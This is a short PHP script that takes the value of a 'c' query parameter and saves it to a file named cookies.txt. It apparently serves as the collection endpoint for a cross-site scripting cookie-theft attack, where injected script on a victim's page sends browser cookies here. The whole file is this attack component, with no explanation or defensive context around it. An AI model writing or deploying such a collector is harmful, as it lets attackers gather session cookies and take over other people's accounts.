<?php

if (isset($_GET["c"])) {
	$cookie = $_GET["c"];
	file_put_contents("cookies.txt", $cookie);
}
